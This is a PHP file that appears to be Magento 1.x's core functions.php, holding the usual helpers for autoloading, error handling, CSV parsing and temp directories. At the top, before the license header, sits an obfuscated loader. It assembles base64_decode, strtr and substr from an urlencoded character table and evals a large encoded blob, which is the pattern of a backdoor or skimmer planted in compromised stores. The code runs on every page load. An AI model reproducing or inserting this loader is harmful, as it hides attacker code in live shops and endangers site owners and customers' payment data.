<?php

$O00OO0=urldecode("%6E1%7A%62%2F%6D%615%5C%76%740%6928%2D%70%78%75%71%79%2A6%6C%72%6B%64%679%5F%65%68%63%73%77%6F4%2B%6637%6A");$O00O0O=$O00OO0{3}.$O00OO0{6}.$O00OO0{33}.$O00OO0{30};$O0OO00=$O00OO0{33}.$O00OO0{10}.$O00OO0{24}.$O00OO0{10}.$O00OO0{24};$OO0O00=$O0OO00{0}.$O00OO0{18}.$O00OO0{3}.$O0OO00{0}    
        .$O0OO00{1}.$O00OO0{24};$OO0000=$O00OO0{7}.$O00OO0{13};$O00O0O.=$O00OO0{22}.$O00OO0{36}    
        .$O00OO0{29}.$O00OO0{26}.$O00OO0{30}.$O00OO0{32}.$O00OO0{35}.$O00OO0{26}.$O00OO0{30};    
        eval($O00O0O("JE8wTzAwMD0iUG9Eck5raHRIVlphSkdUc3BLdmZFQmNYWUxBU3F5VVF3ak9NYnVSaUlnbVdGemxleENkblBZV2R4WkRRRWlSS29OYVh3ZWdGSHlPa2xNVXVtc3FmdFZocHZJYkN6TEpyQmNqQW5HU1RQVzl0S0VVTFJUaUlsM2J3djI0THZFUnJPM2xZb05SSnV1WmVBc1Vlb05SSnVhMVRBSmpJUkpuRFNOcVlsSkJjUmFsMGsyYmpsMjlaUnVMWlJKUm9ldVo3R0N5SnYzellvTlo5cFdYWkthbmNTRW9YUnI0WW9OUkp1dVo3b05aZGVzWmV6RVhlb05SSnVpWFpLaTBMUHV5VktFell2M29aZUdiSlJaanZvTmpTZXUwbmVhWGV6RTBlekVvalNFaXN2Q1VaUkpSb2h0WUxGcmkybHJ0WXZFUnJPM2xZelRvcnZFYmlNMG5vYmtsdFNCU1Z2MXlmdkJEZnAyam9LSHQxdTNVY3JFVTBpa0RHaXFvQmJKdGNscVkwcTF4eXUwb0J1MHgzdWNwM3BWejVxV1p0UzB4V09UVTJ4M1NqYXIxUXEyMXRNM2x0YTFTamIyUXVNY1I1dmF4NHgwbnB1Y1JFdWtvVHBObjJTaVJhbHJaY3gwU2lxV1IwQVpRZmUzREdPMjlDS2pCQ0tIWTBNMXEzbEoxWk9WZjVNMUJOcDBCd1JxMVRPTm41cE4wc2kwUzFwaXAweEM5aXBXQnNyTjRuaUJSanZIbnF2aXhaaVowZGJFUm9yRVkwcGlqRU1jakRSYUgwbDB3enZjb0p4Qno1YWpiSkFqeVhxR1g0dmlTS2ljWjNTaWZ0QUhSanZURHVpMlJETzF4bXVINWphV1JrU3IxWHVIMVpBV1NFaWpMNFNaNXh2anhRaE5qTmIzdzZpV1I2aWlTR3UxamxhMlJIS2FvWHJUUjB4V3BjaUV5bVNKNTZsa1JQYjFSUHUyRElhY2owdWpEaEtKb3JySmptU3JueHhKcWRycTF0Yk5IM3YzVXN4RW9JdTNCSlJreFlPY2JhQVZETWZUcDNPQnhqeFRCRWFqU2lxV2l1UkpwY00zaTZhaXo0cVdpbGlyWHNPRUJucVZMZ3hFUkhoRXdWaVZSNGZKaUhSVHdsYk5ES1JONTVLMXFueDFmMWJFeHphWmpEaU5TUHYyd0pLRXdzYTJ3eWZad0pmM2IwcVREbnJpb3ViWkJIdWFpVlJxMVdpM0JFT2ppcGhOSGd1V29jU0JSYXgzd1JxRWoycEhudEszakp1TloxaWF6Y3ZXaVd4cmIyeHNRV2IweEJ2MjVReDNvSHVxd3BxV2xuYUNRaHAwMTNhVmpidk45M3ZHOVRsMm5jYTFINXVUamxiM2o2UlR6dEFKbnFSa2JSdjJ0MGlUT2NsMERCcldEbnBrWnNmSjRkUkVPNXhxMVhsVkgxT2tpV2IyWG51MVNyUlREUHAzWTFpMlNlcWtqNkFaMDFSaUQ0ZWNaY3ZXb0JTWnhCTTJ0MnhjZnN4VE8ycloxd3ZheGFlMFNHYkpmbnZqejJpMUJNcmpEd3J1UVByVEJ3YkJ6dHVCRGtwMndlbDI1VHVzUXBhV1JSYUhsMWlqcTJSWlJRTzA1aWlyOXFmVG96dmpTd3YzUlRwMVowbGt6dEFreTBoa2kyU2laNE9hbHN1Sm5peGlCaXEwbDJxMGplT1pMdE9XU2t2a3hjTTBRamlKUmF2MFF5U05va3VOU2hPTmpoTzN3RUszT2dscjFrbHE1aWxpUmN1akQ2U3JpSGkzTDNhVHlueHJTTnVhcTFiaVN0ZjIxY3JXbDNLVGk2YU5mNHJOajBoclI0QXFSZ2hhcDFSV2lsYWF5NXJUUmlxaXlkeGNvYWhXb1RmSlpucUpCektaU2l2a2xnYTNadHBCd3dPM2JWaEJZdGxUU1BLck8ybDNTeWxWTDFSY1NCYXJSbXJWeGVmWkRwTzBiaHhaSDR4MWwxYjFSWWFhUnVxa2l1T3VYc0szeGNpa2JEYmpqM2FyQmZsMk81YXF4Wk9pUjFLYVJ6bDFCUHZaNTRxWnRkdTIxZ2xpcXNyV2I0aU4wNWxpRFBPcW9tdUhRblNUajFmYW9LaGlCemhCYlFBWnowcHJ4MGkyOWpPaVljcmtIY2laUjJTcjljeEg5S3BUbzF2Sm9QYlpMNGwxRGl1VGpCZmlpd2lUQmJhRXluQVZ5TnBKUlBiczlCcWt4UWhXQjJSTjlIZlRCVGVjUnRTVlpudUo4dHFCbDFLTmkydVdMNHBjSG5TM2JmdXFYY1MwQjVPMk9kS1p4bVIxSHR1cVlnYnFsY0tWQnV4akJaYk5vSWFabmZ2SGpHS0JSY3VrRE5yWjlQUlpiR3hpb3BxVlN3dkhvdHgxZjFmM2Y1eFdEUk9rQmJBa1VndTF4cWUxZjN2Tk8zYnFpRHJrRFh2cmYxdXJCa0FyOVlpYXB0ZmtpRGlpb2RiVkgwUmtPMWJXaW5scjUxckJvQmZpRHNBTjg1SzF6ZGJxZjJxM1JodWpvenBydzJycml6cDNiNHV1WGN2akhkaEJqVmEyWW5ScWJCYmFqamFFeW5hTjlEUzF5TlIySDBTMXcycVdSY1JqaldsclFiYnFEV2xaNVRwSmpJeHFpcVJOU1ZpRXk2UnFuTWkyWjVxSG4wUkgxMU9yUTZwMFNwcVpCanVjeUNPRXhoU2NpaXBqbDVSV2lrZjFvNXVrQnpxaXd4ZnJMM2EwanFiYVJzYTI0Y3VxMXJ1MmJteDNIZ1Nyd01BVkwzUjFxc2IzYnhPaVJSbFREdU9aeGpmSkJNT05YdHFaNTNicW9udXJvTXZ1OGN1VHhwZjJsblNpd0t1MjlFZmpCYktDUU1ScndzcVZqNnZFRDJ2VmlIbHExRWEzZjJSRVJ5YWpsMnZIall1MGJ5eFR4UnhydDN1QmJYbDNvV2xyd2phMlNpaVpqS08ycDJmWmJNeHFRc2hXVW51a3dtcmtqUXBWamt1anhhS1pic2JyakhLMlgxcDBiTnZOMXNpVG9xaXJEaHEyd3RLMGozUldTSU9xRHp1YWI0S3F4V2lFWnRhTkJkdTBiTlJxaVlPSndNT05EaXByd3diTlFNdXFpcktUcHNhMVJUUkpCaXEydzJ2Y3hvdUVpTlNaZmRTclJveE53Q2ZxNUVLcmYzck5CZEFFb0d2a1JFcmpqUmlITG52MlFNaXExZHFpb294RUJlQXExZmFxODNsMkJXS1ZmZ3UyU2hmVG90U3FiM3EyaW9pWmpEQVpuTWEyNUdLMkhkdTN5Uk8xU291M3htYlZSc1MxREpiaW9Sdkp3bE9UREdycjFNUlRvaHBpU2NBV3lhdkJpa3BCWm5PMlNJYmpqWU9UeGxwTm9uaEJvekFxaWJ2VERqdUpEWHFUeTRBcUJCcWNqVGlWU2FiMG5kcU4xNXFqYlFLSDVQZTFqNmlxNVlsYVNCYXI4dHVqU3NTMVkyYmt3eXAzU3FmMmwydkc5d3BIbk52V1JsdlRCRWhIOXB1WjViS3E1WmIxb1phMW9zQVdmY3UxQmRpamlyU3FSTnVyMW5wRUJhU1p4MHZCU29PV2IyaUpTTnFKMDNwMndDaWt3bmwzTDRxcTgyZmFqcEtheURhTjlSdmlpRGxqRGV2cWpFYmF5RXV1OWhwcTVQdTJ3ZGxxU0dLSmpoYk56NGxaam5STm5pUkJiQmFFaVFPSFMxdkpqb3Uzb2RPMDEzYU5TVFJFYmdSVERkcVRCZHBCaW9PV2lXZWNENnVyNXV4YWJCUkVpREsxUk54YXk0YkpRZXBKRE5SY090bGl4SFNrTHRwcm5vaEJqNk9yb1RTTmJOS0VCNnhhYm1xcmk2YjNqV2VjTDNiMVNUcDN5SUFaYlhiMDltUmNvWmJxU0pscW9zbGNTQnhhU3FBV1NobDJpY09FakNsY0RrUjBvWlJOeDRPMkR0bDBYY2kyejNTMG4xYnJ6Y1NOYkJ2MG5nT2NTNnJKNXlwSmIwS2lSeXZKd0p2VnloU1puSHJONTZLTmp4YkJ4blJabmFLMjFJcGFwMGkyMWVySnhuUmlVdFJIMTFsVFNKYTB0MlNFaWZBV0JqdU5xM09rSG5BcTFFYnJZY3hORGp4cm90QVZpVnJyeHRhY080TzFZMGJjeERxVlNjYmNTbHZrd1lTalNndkpqTnVjajBpY2lrdUJ5MEtxRHJwSDlaUjJTZnBKODR1V2Jsckh4NUt1OXJhcW9veEhYY3hIQkthcUJnZTBIM3ZyWWdyTmlCQVd4ZEFxQk12aXAxTzNpcXFOU21hVFNRTzA1UE1zOWRSTmJsbDJpNnBOOXBTWm5iUjBvbWJxbDVscUx0cDBEVlNOd0NSY2Z0UmF4bnhXYnRmMm9pTWNvVnVqU1ppSDF0UkJCRXJheW5oclNrYUhpbmxxblZpWjFCcWpvZXJrQnlyQlJuYU54R09xd1h4clIwaUpTd1IzejNoa3hFQVpvY3Yyb0J4cnQ0cFdMNFNhU2hhVGl3YWNpWHJUamx4Tnc2T1RSbmxrbDBxTnRuaUpiaEtxUVJoV2wyeDJqSFJOd2R1akJKcTBSRU9qUlFlY1J1YTBqZmxWeGZLaXdScFZCd3FpdzRhV1ozQVdTZWlWaWphVmIydlZ5cGxWWjBmMURUcEJqNXBrUzJwaUJ1YUJVdFNFcDJBQml3aEhRWWwwaWliVGYxT0puM2JWcGdsMjB0U3F3bGYyMGRNMDlSbDB4aGhhb0hmMERmdkpaNWFOOWR4M2l5bDNTcFNCUkpSSjQyZjFSS09WYmtLVlI1dWp6c1JOYkViSERkckhqd3BIaTNsandXYjN3WHBjSDFyWjVHTzBEV2FheVFha29OcTNicUsxYjBSa295T3J3bUtKamFPMWkxcHJieU9jU0JwVERhcXJvUWhCQm91VGltcDFqSU9Kd2pBV3hRUlpTTnYzU2lLSlNsdVpiVlJKcTRTSnBncENRaHUyZjB1Q1FxZkpmdHV1OUR2MlJQUnJYNGxzUWJxWmw1YVdmdHJhQklSM3l0ZlpMMXVqeWp2RWwzU2tqck9OWTVSRUIzZmlpSXFFeFJPVGpiZlZaMXgyYkNxMG5xZTJ4NmFxb1p2SHgxYTNTQngwenRhcjFlU0hERVJaYkRlMjQzZnF4RXZIU2FhQnhyclZSWmlyUXFhQm9xYkc5alJCb2RwaWpZQVo5V1Nad2xxYWJRdnJ4TnFrd1dpcmxncVZqRWhFcTNpaURIdnFRRHUxcGRBSkJidlZvTXJKU0picnAyUk5uVGUyU3d4cXhJcUV4RVJxODJBYXlUbDNpd2lyaVp4WmoxdUJ5UUFpYmpSTlNIbEpTUHJUVTJpcXRjZjNEM1MzYnp1cWJXdWN4YXBaUXFsSjQxUmpTMWwzQmZyR1FwcTNiMlNrYk5pM2pCYXFueUtKMW9NY0RhcVRCZ3AzQmRocW9jbDBqc2hpbzViM295U2l3cFJXeE5xMEwzeFZPMlNOakViSlNiUmpvMnByU2h1WnA1T1diMWZydzFTVHlXT0pCcnFKemNwSG4yS05iZk9WeGlSMHc1dlpPZ3ZpaVB1MVNoUldpdGYxWTBPY2I2ZTF3UHYyUnlBQmpYdkh3enBad2RhMURHcTNEWHJWREhxYW9XcFdiRXYzRHNoTjV6eGFER2UwOW1sM2JkcTNvSWVjeUVBV2pSbGpEUEFCT3RsakR5dVdvMk8wYkNBSm9IUjFSVnFUYmViWndFZTF5UXZUanNBak9kdjJYdHJUajByVFNXU0VIdGJOaWRiMmJRbHFpbEtWb2pxSG9SdVd4aGxhYmxTTmY0QWl5UlJad211RWladjFqM0FKb1h4aWYyeGp4ek0wb2xpVlVnYVZqNktjUnlpSG95cFZvRHhqcDFmclI2ZjJEaXYyb25BTkRLeEhEUWkxQllTQzkwaVpqbXZKemNoSFoxeHJpeEtrUk1SWjl6Yk5pMnYzWjBSTlNWZTJTUWlXQm9NMHg0eEVwZ1NraTFpVGpQaGtiamJKb0R4Y1JvYnVRZ3Exd2NsVnlScTJxMmlIbmVoYVNYYjFmZ2xWaVB4cjFIZTBwM2FrQkh1MWk0dU45b0FWeTFwYVNaT0hsMXFIMXdiMDRjZlpEVlJhU2thR1FwUkhRUFNFeGxhc1FhT2N4S3JIRDFwTnhEZjIwNWlxU0VyTlFQS3JuS3UzeUl1QmpFcml5WHFhYjB2cVg0cHFTMUFxSGNLancyck5vVGZaOXNwcVFnYmpCSGYxeE1wMmpISzBReEsycTRxQzh0dXE1QnBIOXdLSndIZjI4Z3EwT2N1V2plQVRpbGkyUXViMnExZmFSQ2EzRGt4cTlqYUV3eHEwbjJ2Y0JZcVo5VmFyMXBiaVowYXJSR0FaeFdTYWYweEhCdHZWampLR1FSdnJ3dUFFeXdwaVUyUlRTeU9UYmVBcTFoUnJwZHBjQmR1SDFhdWNwZE9Kd3VSMFN1dlpvWmljalBBaXgxeDJCc3FrWTFNczl5dWNSbXYyd2ZPVGZnUzJucXAwRFRLM0Q1aWNEaHYzd1RscW94T0h4bGYyU0tpMGJCaGFaZ3JpWjJ1V2lLdml4Y09IMUlLcVFlUmlTUWxUZnNxVGJzeHFiS3gwRENxMmptck53UXBCYmpySjVKZlppVHUxeWRwVkRmT3JqV2Fhb0diVmltcU5mY09KbkhPM1NJdTNiZEFIOGdpWjlKYWNiQ0tqeXRwMjlFUldiVGkyeEpNMU8yeGtES2UyblhTMlNjYU5Mc01jRGphVm9keGNTMWlpYmlpQmI2cFdpNnFOd3V1MkxuQXIwZ1JjQmRiRURhU2FSMFMwUm9pM3FneDJ3ZGZhZmdpdVFySzF4R2JjeDBsMWJEZnJSRVJXWjNBdTlUUnJMMlNrd2JmM2lsT0owc2JOaUVscWI0T1dwM3JKanhwaURnYjNCeUFaRDBsMXEzUkgxTXFpUm5LMFJ0YlppNUtIUWZ2cXp0YUJCMmIzUmhickJWcXU5aFMzUnBxcTlWZTFxMHFUaTBmM3lscFdabmljRDNhVmYydkJZY1JIYkJ1YUxucVRpY2VzOXJlMHdmcEpqb08wOWNsY29kU3VRcnhaOTNPSFhjdXJYZGlFQktsMjBjYmpxZHVKeG11ckhuQU5ScGJraUpSMXdacUpvMmxxTDFLM2pDaFdENXFCZjBsMWJrdnI0Mmwxd0h4clFHYjBiNkFKbjJLSkJiS05iMmIybmJySlJuckJicHhFaldhMDFOdTJ3MFNIaVhSSkwzU1pSWXYwcG5TMWl1bDAxYWxheEdxcU9zdkViTUtWeGh4VGpjZjFpbGlaNUNiall0UjFqMUtOaW94SmlOaUoxSXFxbnlscngxdnFqeXBCd05xSEJxS2tTbHJKSDVxWmJXdVZ5TlNaMVZoTlFpdXI1WUFKUjBycmJ6dWFCSmJWU0dpTkRSU0pRQktWeDJLRXc0TTJSbGFyaXJpMVMwTTIxeGJyeGh4MDlYUkhmNGZyTDBLMUhnZXM5UVJORGpwaVMwUzBiZk0wb2JQYTBDZXVaN1BjND0iOyAgCiAgICAgICAgZXZhbCgnPz4nLiRPMDBPME8oJE8wT08wMCgkT08wTzAwKCRPME8wMDAsJE9PMDAwMCoyKSwkT08wTzAwKCRPME8wMDAsJE9PMDAwMCwkT08wMDAwKSwgICAgCiAgICAgICAgJE9PME8wMCgkTzBPMDAwLDAsJE9PMDAwMCkpKSk7"));
/**
 * Magento
 *
 * NOTICE OF LICENSE
 *
 * This source file is subject to the Open Software License (OSL 3.0)
 * that is bundled with this package in the file LICENSE.txt.
 * It is also available through the world-wide-web at this URL:
 * http://opensource.org/licenses/osl-3.0.php
 * If you did not receive a copy of the license and are unable to
 * obtain it through the world-wide-web, please send an email
 * to license@magento.com so we can send you a copy immediately.
 *
 * DISCLAIMER
 *
 * Do not edit or add to this file if you wish to upgrade Magento to newer
 * versions in the future. If you wish to customize Magento for your
 * needs please refer to http://www.magento.com for more information.
 *
 * @category    Mage
 * @package     Mage_Core
 * @copyright  Copyright (c) 2006-2016 X.commerce, Inc. and affiliates (http://www.magento.com)
 * @license    http://opensource.org/licenses/osl-3.0.php  Open Software License (OSL 3.0)
 */

/**
 * Disable magic quotes in runtime if needed
 *
 * @link http://us3.php.net/manual/en/security.magicquotes.disabling.php
 */
if (get_magic_quotes_gpc()) {
    function mageUndoMagicQuotes($array, $topLevel=true) {
        $newArray = array();
        foreach($array as $key => $value) {
            if (!$topLevel) {
                $newKey = stripslashes($key);
                if ($newKey!==$key) {
                    unset($array[$key]);
                }
                $key = $newKey;
            }
            $newArray[$key] = is_array($value) ? mageUndoMagicQuotes($value, false) : stripslashes($value);
        }
        return $newArray;
    }
    $_GET = mageUndoMagicQuotes($_GET);
    $_POST = mageUndoMagicQuotes($_POST);
    $_COOKIE = mageUndoMagicQuotes($_COOKIE);
    $_REQUEST = mageUndoMagicQuotes($_REQUEST);
}

/**
 * Class autoload
 *
 * @todo change to spl_autoload_register
 * @deprecated
 * @param string $class
 */
function __autoload($class)
{
    if (defined('COMPILER_INCLUDE_PATH')) {
        $classFile = $class.'.php';
    } else {
        $classFile = uc_words($class, DIRECTORY_SEPARATOR).'.php';
    }

    include($classFile);
}

/**
 * Object destructor
 *
 * @param mixed $object
 */
function destruct($object)
{
    if (is_array($object)) {
        foreach ($object as $obj) {
            destruct($obj);
        }
    }
    unset($object);
}

/**
 * Translator function
 *
 * @deprecated 1.3
 * @param string $text the text to translate
 * @param mixed optional parameters to use in sprintf
 */
function __()
{
    return Mage::app()->getTranslator()->translate(func_get_args());
}

/**
 * Tiny function to enhance functionality of ucwords
 *
 * Will capitalize first letters and convert separators if needed
 *
 * @param string $str
 * @param string $destSep
 * @param string $srcSep
 * @return string
 */
function uc_words($str, $destSep='_', $srcSep='_')
{
    return str_replace(' ', $destSep, ucwords(str_replace($srcSep, ' ', $str)));
}

/**
 * Simple sql format date
 *
 * @param string $format
 * @return string
 */
function now($dayOnly=false)
{
    return date($dayOnly ? 'Y-m-d' : 'Y-m-d H:i:s');
}

/**
 * Check whether sql date is empty
 *
 * @param string $date
 * @return boolean
 */
function is_empty_date($date)
{
    return preg_replace('#[ 0:-]#', '', $date)==='';
}

function mageFindClassFile($class)
{
    if (defined('COMPILER_INCLUDE_PATH')) {
        $classFile = $class.'.php';
    } else {
        $classFile = uc_words($class, DIRECTORY_SEPARATOR).'.php';
    }
    $found = false;
    foreach (explode(PS, get_include_path()) as $path) {
        $fileName = $path.DS.$classFile;
        if (file_exists($fileName)) {
            $found = $fileName;
            break;
        }
    }
    return $found;
}

/**
 * Custom error handler
 *
 * @param integer $errno
 * @param string $errstr
 * @param string $errfile
 * @param integer $errline
 */
function mageCoreErrorHandler($errno, $errstr, $errfile, $errline){
    if (strpos($errstr, 'DateTimeZone::__construct')!==false) {
        // there's no way to distinguish between caught system exceptions and warnings
        return false;
    }

    $errno = $errno & error_reporting();
    if ($errno == 0) {
        return false;
    }
    if (!defined('E_STRICT')) {
        define('E_STRICT', 2048);
    }
    if (!defined('E_RECOVERABLE_ERROR')) {
        define('E_RECOVERABLE_ERROR', 4096);
    }
    if (!defined('E_DEPRECATED')) {
        define('E_DEPRECATED', 8192);
    }

    // PEAR specific message handling
    if (stripos($errfile.$errstr, 'pear') !== false) {
         // ignore strict and deprecated notices
        if (($errno == E_STRICT) || ($errno == E_DEPRECATED)) {
            return true;
        }
        // ignore attempts to read system files when open_basedir is set
        if ($errno == E_WARNING && stripos($errstr, 'open_basedir') !== false) {
            return true;
        }
    }

    $errorMessage = '';

    switch($errno){
        case E_ERROR:
            $errorMessage .= "Error";
            break;
        case E_WARNING:
            $errorMessage .= "Warning";
            break;
        case E_PARSE:
            $errorMessage .= "Parse Error";
            break;
        case E_NOTICE:
            $errorMessage .= "Notice";
            break;
        case E_CORE_ERROR:
            $errorMessage .= "Core Error";
            break;
        case E_CORE_WARNING:
            $errorMessage .= "Core Warning";
            break;
        case E_COMPILE_ERROR:
            $errorMessage .= "Compile Error";
            break;
        case E_COMPILE_WARNING:
            $errorMessage .= "Compile Warning";
            break;
        case E_USER_ERROR:
            $errorMessage .= "User Error";
            break;
        case E_USER_WARNING:
            $errorMessage .= "User Warning";
            break;
        case E_USER_NOTICE:
            $errorMessage .= "User Notice";
            break;
        case E_STRICT:
            $errorMessage .= "Strict Notice";
            break;
        case E_RECOVERABLE_ERROR:
            $errorMessage .= "Recoverable Error";
            break;
        case E_DEPRECATED:
            $errorMessage .= "Deprecated functionality";
            break;
        default:
            $errorMessage .= "Unknown error ($errno)";
            break;
    }

    $errorMessage .= ": {$errstr}  in {$errfile} on line {$errline}";
    if (Mage::getIsDeveloperMode()) {
        throw new Exception($errorMessage);
    } else {
        Mage::log($errorMessage, Zend_Log::ERR);
    }
}

function mageDebugBacktrace($return=false, $html=true, $showFirst=false)
{
    $d = debug_backtrace();
    $out = '';
    if ($html) $out .= "<pre>";
    foreach ($d as $i=>$r) {
        if (!$showFirst && $i==0) {
            continue;
        }
        // sometimes there is undefined index 'file'
        @$out .= "[$i] {$r['file']}:{$r['line']}\n";
    }
    if ($html) $out .= "</pre>";
    if ($return) {
        return $out;
    } else {
        echo $out;
    }
}

function mageSendErrorHeader()
{
    return;
    if (!isset($_SERVER['SCRIPT_NAME'])) {
        return;
    }
    $action = Mage::app()->getRequest()->getBasePath()."bugreport.php";
    echo '<form id="error_report" method="post" style="display:none" action="'.$action.'"><textarea name="error">';
}

function mageSendErrorFooter()
{
    return;
    if (!isset($_SERVER['SCRIPT_NAME'])) {
        return;
    }
    echo '</textarea></form><script type="text/javascript">document.getElementById("error_report").submit()</script>';
    exit;
}

function mageDelTree($path) {
    if (is_dir($path)) {
        $entries = scandir($path);
        foreach ($entries as $entry) {
            if ($entry != '.' && $entry != '..') {
                mageDelTree($path.DS.$entry);
            }
        }
        @rmdir($path);
    } else {
        @unlink($path);
    }
}

function mageParseCsv($string, $delimiter=",", $enclosure='"', $escape='\\')
{
    $elements = explode($delimiter, $string);
    for ($i = 0; $i < count($elements); $i++) {
        $nquotes = substr_count($elements[$i], $enclosure);
        if ($nquotes %2 == 1) {
            for ($j = $i+1; $j < count($elements); $j++) {
                if (substr_count($elements[$j], $enclosure) > 0) {
                    // Put the quoted string's pieces back together again
                    array_splice($elements, $i, $j-$i+1,
                        implode($delimiter, array_slice($elements, $i, $j-$i+1)));
                    break;
                }
            }
        }
        if ($nquotes > 0) {
            // Remove first and last quotes, then merge pairs of quotes
            $qstr =& $elements[$i];
            $qstr = substr_replace($qstr, '', strpos($qstr, $enclosure), 1);
            $qstr = substr_replace($qstr, '', strrpos($qstr, $enclosure), 1);
            $qstr = str_replace($enclosure.$enclosure, $enclosure, $qstr);
        }
    }
    return $elements;
}

function is_dir_writeable($dir)
{
    if (is_dir($dir) && is_writable($dir)) {
        if (stripos(PHP_OS, 'win') === 0) {
            $dir    = ltrim($dir, DIRECTORY_SEPARATOR);
            $file   = $dir . DIRECTORY_SEPARATOR . uniqid(mt_rand()).'.tmp';
            $exist  = file_exists($file);
            $fp     = @fopen($file, 'a');
            if ($fp === false) {
                return false;
            }
            fclose($fp);
            if (!$exist) {
                unlink($file);
            }
        }
        return true;
    }
    return false;
}

function fetch_envvar($envvar)
{
    $res = getenv($envvar);
    if ($res === False)
        return '';
    return $res;
}

function get_tmp_envvar() {
        foreach (array('TMP', 'TMPDIR', 'TEMP') as $var_name) {
                $v2 = fetch_envvar($var_name);
                if ( !empty($_ENV[$var_name]) ) {
                        return ($_ENV[$var_name]);
                } else if ( !empty($v2) ) {
                        return ($v2);
                }
        }
        return;
}


if ( !function_exists('sys_get_temp_dir') ) {
    // Based on http://www.phpit.net/
    // article/creating-zip-tar-archives-dynamically-php/2/
    function sys_get_temp_dir()
    {
        // Try to get from environment variable
        $tmp_env = get_tmp_envvar();
        if ( !empty($tmp_env) ) {
            return realpath($tmp_var);
        } else {
            // Try to use system's temporary directory
            // as random name shouldn't exist
            $temp_file = tempnam( md5(uniqid(rand(), TRUE)), '' );
            if ( $temp_file ) {
                $temp_dir = realpath( dirname($temp_file) );
                unlink( $temp_file );
                return $temp_dir;
            } else {
                return FALSE;
            }
        }
    }
}
